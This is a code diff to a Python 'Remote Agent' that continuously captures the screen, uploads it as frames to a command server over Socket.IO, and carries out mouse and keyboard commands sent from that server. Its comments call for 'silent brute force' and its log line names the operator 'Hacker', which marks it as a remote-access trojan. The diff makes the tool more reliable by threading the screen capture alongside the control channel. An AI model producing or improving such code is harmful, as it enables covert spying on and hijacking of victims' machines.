@@ -10,6 +10,7 @@ import sys
 import uuid
 import hashlib
 import pyautogui
+import threading
 
 # Tell PyAutoGUI not to gracefully fail, we want silent brute force
 pyautogui.FAILSAFE = False
@@ -81,6 +82,7 @@ def handle_input(data):
     """
     try:
         action = data.get('action')
+        print(f"[*] Received Command from Hacker: {action}")
         
         # Mouse Control
         if action == 'mouse_move':
@@ -109,13 +111,7 @@ def handle_input(data):
         print(f"[!] Input command failed: {e}")
 
 def start_streaming():
-    """Captures the computer screen continuously and uploads it to the server."""
-    try:
-        sio.connect(SERVER_URL, transports=['websocket', 'polling'])
-    except Exception as e:
-        print(f"[!] Could not connect to {SERVER_URL}. Is the server running?")
-        sys.exit(1)
-        
+    """Captures the computer screen continuously and uploads it to the server in a background thread."""
     with mss.mss() as sct:
         # Index 1 grabs the primary monitor
         monitor = sct.monitors[1]
@@ -126,9 +122,10 @@ def start_streaming():
                 continue
                 
             try:
-                # 1. Grab screen data
+                # 1. Grab screen data and remove transparent Alpha channel
                 sct_img = sct.grab(monitor)
                 img = np.array(sct_img)
+                img = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
                 
                 # 2. Balanced Screen Upgrade (75% resolution, 75% JPEG quality)
                 # Full 100% resolution HD backs up the WebSocket queue and causes input lag.
@@ -137,18 +134,18 @@ def start_streaming():
                 height = int(img.shape[0] * scale_percent / 100)
                 resized = cv2.resize(img, (width, height), interpolation=cv2.INTER_AREA)
                 
-                # Compress just enough for the WebSocket to handle the bandwidth
-                encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 75]
+                # Compress specifically for WebSockets
+                encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 65]
                 _, buffer = cv2.imencode('.jpg', resized, encode_param)
                 
-                # 3. Convert image to Base64 text to send over WebSocket
+                # 3. Base64 Encode (Crucial for socketio JSON serialization)
                 jpg_as_text = base64.b64encode(buffer).decode('utf-8')
                 
-                # 4. Stream frame to Server
+                # 4. Stream frame
                 sio.emit('video_frame', {'client_id': CLIENT_ID, 'frame': jpg_as_text})
                 
-                # Limit to roughly 15 frames per second to allow input events to be processed
-                sio.sleep(0.06)
+                # Limit to 10 FPS. Going faster overflows the socket and drops frames!
+                time.sleep(0.1)
                 
             except Exception as e:
                 # Silently ignore frame drops to keep running
@@ -157,4 +154,17 @@ def start_streaming():
 if __name__ == '__main__':
     print("[*] Remote Agent Started.")
     print("[*] Connecting to Command Server...")
-    start_streaming()
+    
+    # 1. Start the CPU-heavy Screen Capture in a Background Thread
+    # This prevents the `while True` loop from blocking PyAutoGUI clicks
+    stream_thread = threading.Thread(target=start_streaming, daemon=True)
+    stream_thread.start()
+    
+    # 2. Start the WebSockets on the Main Thread (Required for PyAutoGUI)
+    try:
+        sio.connect(SERVER_URL, transports=['websocket', 'polling'])
+        # Keep the SocketIO listeners alive indefinitely on the main thread
+        sio.wait()
+    except Exception as e:
+        print(f"[!] Could not connect to {SERVER_URL}. Is the server running?")
+        sys.exit(1)
